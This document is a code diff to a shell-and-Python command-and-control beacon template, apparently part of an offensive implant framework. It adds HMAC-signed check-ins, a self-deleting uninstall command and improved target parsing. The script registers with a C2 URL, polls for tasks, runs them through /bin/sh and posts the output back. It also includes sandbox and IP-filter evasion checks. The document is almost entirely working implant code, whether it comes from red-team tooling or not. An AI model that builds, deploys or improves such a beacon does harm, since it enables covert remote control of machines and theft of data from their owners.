@@ -19,6 +19,7 @@ generate_beacon_id() {
     printf '%s' "$id"
 }
 BEACON_ID="$(generate_beacon_id)"
+BEACON_KEY="{{BEACON_KEY}}"
 SLEEP={{SLEEP}}
 JITTER={{JITTER}}
 PROTO="{{PROTO}}"
@@ -65,7 +66,10 @@ check_sandbox() {
 
 check_ip_filter() {
     [ -z "$ALLOWED_IPS" ] && [ -z "$BLOCKED_IPS" ] && return 0
-    local public_ip=$(curl -s --max-time 5 http://api.ipify.org 2>/dev/null || curl -s --max-time 5 http://ifconfig.me/ip 2>/dev/null)
+    # Local interface addresses only; no third-party IP echo service.
+    local public_ip
+    public_ip=$(hostname -I 2>/dev/null | awk '{print $1}')
+    [ -z "$public_ip" ] && public_ip=$(ip addr show 2>/dev/null | grep 'inet ' | grep -v '127.0.0.1' | head -1 | awk '{print $2}' | cut -d/ -f1)
     [ -z "$public_ip" ] && return 0  # fail-open
     if [ -n "$BLOCKED_IPS" ]; then
         IFS='|' read -ra entries <<< "$BLOCKED_IPS"
@@ -102,8 +106,39 @@ check_admin() {
 }
 
 json_escape() {
-    python3 -c "import sys,json; print(json.dumps(sys.stdin.read()))" 2>/dev/null <<< "$1" || \
-    printf '"%s"' "$(echo "$1" | sed 's/\\/\\\\/g; s/"/\\"/g; s/\n/\\n/g')"
+    # stdin-less invocation avoids the trailing-newline artifact of herestrings.
+    local out
+    out=$(printf '%s' "$1" | python3 -c "import sys,json; sys.stdout.write(json.dumps(sys.stdin.read()))" 2>/dev/null)
+    if [ -n "$out" ]; then
+        printf '%s' "$out"
+        return
+    fi
+    # Pure-shell fallback: strip control chars, escape backslash/quote, join
+    # lines with \n so the result stays valid JSON.
+    out=$(printf '%s' "$1" | tr -d '\000-\010\013\014\016-\037\177' | sed -e 's/\\/\\\\/g' -e 's/"/\\"/g' | awk 'BEGIN{ORS=""} {if (NR>1) printf "\\n"; printf "%s", $0}')
+    printf '"%s"' "$out"
+}
+
+# HMAC-SHA256 request signing (openssl; python3 fallback). $1 = signing input.
+hmac_sign() {
+    local sig
+    sig=$(printf '%s' "$2" | openssl dgst -sha256 -hmac "$1" 2>/dev/null | awk '{print $NF}' | tr -d '\r\n')
+    if [ -z "$sig" ]; then
+        sig=$(printf '%s' "$2" | python3 -c 'import sys,hashlib,hmac; print(hmac.new(sys.argv[1].encode(), sys.stdin.buffer.read(), hashlib.sha256).hexdigest())' "$1" 2>/dev/null)
+    fi
+    printf '%s' "$sig"
+}
+
+# Computes signature globals AUTH_TS / AUTH_NONCE / AUTH_SIG for the given
+# body. $1 = body.
+auth_sign_body() {
+    AUTH_TS=$(date +%s)
+    AUTH_NONCE=$(openssl rand -hex 8 2>/dev/null)
+    if [ -z "$AUTH_NONCE" ]; then
+        AUTH_NONCE=$(head -c8 /dev/urandom 2>/dev/null | od -An -tx1 | tr -d ' \n')
+    fi
+    [ -z "$AUTH_NONCE" ] && AUTH_NONCE="$(date +%s%N)-$RANDOM-$$"
+    AUTH_SIG=$(hmac_sign "$BEACON_KEY" "${AUTH_TS}.${AUTH_NONCE}.${1}")
 }
 
 get_host_json() {
@@ -179,6 +214,13 @@ except:
         [ -z "$line" ] && continue
         local task_id="${line%%|||*}"
         local cmd="${line#*|||}"
+
+        if [ "$cmd" = "__UNINSTALL__" ]; then
+            $SEND_RESULT_FN "$task_id" "UNINSTALLED"
+            # Script stagers carry no persistence; remove the script itself (best effort) and exit.
+            rm -f "$0" 2>/dev/null
+            exit 0
+        fi
 
         if [ "$cmd" = "__EXIT__" ]; then
             $SEND_RESULT_FN "$task_id" "BEACON_TERMINATED"
@@ -279,8 +321,13 @@ elif cmd.startswith('__DELETE__ '):
 http_register() {
     local json=$(get_host_json)
     local resp
+    auth_sign_body "$json"
     resp=$(curl -s -X POST "${C2_URL}/checkin" \
         -H "Content-Type: application/json" \
+        -H "X-Beacon-ID: ${BEACON_ID}" \
+        -H "X-Beacon-Timestamp: ${AUTH_TS}" \
+        -H "X-Beacon-Nonce: ${AUTH_NONCE}" \
+        -H "X-Beacon-Sign: ${AUTH_SIG}" \
         -d "${json}" -m 10 2>/dev/null)
     [ "$resp" = "__TERMINATE__" ] && exit 0
 }
@@ -291,17 +338,28 @@ http_send_result() {
     local escaped_output
     escaped_output=$(json_escape "$output")
     local json="{\"task_id\":\"${task_id}\",\"output\":${escaped_output},\"beacon_id\":\"${BEACON_ID}\"}"
+    auth_sign_body "$json"
     curl -s -X POST "${C2_URL}/checkin" \
         -H "Content-Type: application/json" \
+        -H "X-Beacon-ID: ${BEACON_ID}" \
+        -H "X-Beacon-Timestamp: ${AUTH_TS}" \
+        -H "X-Beacon-Nonce: ${AUTH_NONCE}" \
+        -H "X-Beacon-Sign: ${AUTH_SIG}" \
         -d "${json}" -m 10 >/dev/null 2>&1
 }
 
 http_checkin() {
     local response
-    response=$(curl -s \
+    local poll='{"type":"poll"}'
+    auth_sign_body "$poll"
+    response=$(curl -s -X POST "${C2_URL}/checkin" \
+        -H "Content-Type: application/json" \
         -H "X-Beacon-ID: ${BEACON_ID}" \
         -H "X-Beacon-OS: $(uname -s) $(uname -m)" \
-        "${C2_URL}/checkin?id=${BEACON_ID}" -m 10 2>/dev/null)
+        -H "X-Beacon-Timestamp: ${AUTH_TS}" \
+        -H "X-Beacon-Nonce: ${AUTH_NONCE}" \
+        -H "X-Beacon-Sign: ${AUTH_SIG}" \
+        -d "${poll}" -m 10 2>/dev/null)
 
     [ -z "$response" ] && return
     [ "$response" = "__TERMINATE__" ] && exit 0
@@ -329,18 +387,34 @@ run_http() {
 # TCP mode uses python3 as a helper for socket framing
 run_tcp() {
     SEND_RESULT_FN="tcp_send_result_stub"
-    python3 -c "
-import socket, struct, json, subprocess, os, sys, time, random, platform
+    PRTS_SCRIPT_PATH="$0" python3 -c "
+import socket, struct, json, subprocess, os, sys, time, random, platform, hashlib, hmac as hmac_mod
 
-C2_URL = '${C2_URL}'
-BEACON_ID = '${BEACON_ID}'
+C2_URL = '''${C2_URL}'''
+BEACON_ID = '''${BEACON_ID}'''
+BEACON_KEY = '''${BEACON_KEY}'''
 SLEEP = ${SLEEP}
 JITTER = ${JITTER}
 
 def get_host_info():
-    return $(get_host_json)
+    # Parsed with json.loads: raw injection would break on JSON booleans
+    # (false/true are not valid Python literals).
+    return json.loads('''$(get_host_json)''')
+
+def tcp_sign(msg_type, data_bytes):
+    ts = int(time.time())
+    nonce = os.urandom(8).hex()
+    mac = hmac_mod.new(BEACON_KEY.encode(), msg_type.encode() + b'.' + str(ts).encode() + b'.' + nonce.encode() + b'.' + data_bytes, hashlib.sha256)
+    return ts, nonce, mac.hexdigest()
 
 def tcp_write(sock, msg):
+    if BEACON_KEY and 'sig' not in msg and 'type' in msg:
+        data_bytes = json.dumps(msg.get('data', '')).encode() if msg.get('data') is not None else b''
+        ts, nonce, sig = tcp_sign(msg['type'], data_bytes)
+        msg = dict(msg)
+        msg['ts'] = ts
+        msg['nonce'] = nonce
+        msg['sig'] = sig
     data = json.dumps(msg).encode()
     sock.sendall(struct.pack('>I', len(data)) + data)
 
@@ -367,16 +441,27 @@ def execute(cmd):
     try:
         r = subprocess.run(['/bin/sh','-c',cmd], capture_output=True, text=True, timeout=120)
         return r.stdout + (('\\n'+r.stderr) if r.stderr else '')
-    except: return 'Error'
+    except Exception as e:
+        return 'Error: ' + str(e)
 
 def sleep_j():
     jr = SLEEP * (JITTER / 100.0)
     time.sleep(max(0.5, SLEEP + random.uniform(-jr, jr)))
 
-parts = C2_URL.rsplit(':', 1)
-host, port = parts[0], int(parts[1]) if len(parts) > 1 else 4444
+def parse_target(url):
+    url = url.strip()
+    if ']:' in url:
+        host, port = url.rsplit(']:', 1)
+        return host.lstrip('[').rstrip(']'), int(port) if port.isdigit() else 4444
+    parts = url.rsplit(':', 1)
+    if len(parts) == 2 and parts[1].isdigit() and parts[0].count(':') <= 1:
+        return parts[0], int(parts[1])
+    return url, 4444
+
+host, port = parse_target(C2_URL)
 
 while True:
+    s = None
     try:
         s = socket.create_connection((host, port), timeout=10)
         tcp_write(s, {'type':'register','data':get_host_info()})
@@ -390,6 +475,15 @@ while True:
                 s.close(); sys.exit(0)
             elif resp.get('type') == 'tasks':
                 for t in resp.get('data', []):
+                    if t.get('command') == '__UNINSTALL__':
+                        tcp_write(s, {'type':'result','data':{'task_id':t['id'],'output':'UNINSTALLED','beacon_id':BEACON_ID}})
+                        tcp_read(s)
+                        import os as _os
+                        try:
+                            sp = _os.environ.get('PRTS_SCRIPT_PATH','')
+                            if sp: _os.remove(sp)
+                        except Exception: pass
+                        s.close(); sys.exit(0)
                     if t.get('command') == '__EXIT__':
                         tcp_write(s, {'type':'result','data':{'task_id':t['id'],'output':'TERMINATED','beacon_id':BEACON_ID}})
                         tcp_read(s); s.close(); sys.exit(0)
@@ -400,10 +494,14 @@ while True:
                 c = resp.get('data',{})
                 if c.get('sleep',0) > 0: SLEEP = c['sleep']
                 if c.get('jitter',-1) >= 0: JITTER = c['jitter']
-    except: pass
+    except KeyboardInterrupt:
+        sys.exit(0)
+    except Exception:
+        pass
     finally:
-        try: s.close()
-        except: pass
+        if s is not None:
+            try: s.close()
+            except Exception: pass
     sleep_j()
 " 2>/dev/null
 }
